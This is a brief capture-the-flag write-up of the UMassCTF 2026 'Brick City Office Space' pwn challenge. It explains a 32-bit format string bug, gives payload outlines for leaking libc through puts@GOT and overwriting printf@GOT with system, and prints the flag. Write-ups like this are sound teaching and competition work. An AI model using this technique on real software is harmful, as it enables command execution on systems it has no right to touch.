# Brick City Office Space — UMassCTF 2026 (PWN)

## TL;DR
32-bit format string vulnerability, No RELRO + No PIE. Leak libc via `%s` on puts@GOT, overwrite printf@GOT with system, send `cat flag.txt`.

## Protections
- No RELRO (GOT writable)
- No canary
- NX enabled
- No PIE (fixed addresses)

## Vulnerability
`printf(user_input)` at 0x8049308 — classic format string. Input at offset 4 on stack.

## Exploit Chain
1. **Leak**: Send `<puts@GOT>LEAK%4$sLEAK` → leak puts libc address
2. **GOT overwrite**: Send `fmtstr_payload(4, {printf@GOT: system})` → overwrite printf with system
3. **Shell**: Send `cat flag.txt` → `printf("cat flag.txt")` = `system("cat flag.txt")`

## Flag
```
UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}
```
